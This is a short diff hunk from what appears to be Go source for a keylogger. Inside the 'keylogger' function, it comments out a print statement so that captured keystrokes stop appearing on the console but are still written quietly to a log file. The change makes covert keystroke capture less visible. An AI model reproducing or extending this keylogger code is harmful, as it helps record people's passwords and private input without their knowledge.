@@ -531,7 +531,7 @@ func keylogger(file *os.File) {
 					tmpKeylog += "}"
 				}
 			}
-			fmt.Printf("%s\n", tmpKeylog)
+			//fmt.Printf("%s\n", tmpKeylog)
 			//fmt.Printf("%d\n", code)
 			file.WriteString(tmpKeylog)
 			tmpKeylog=""
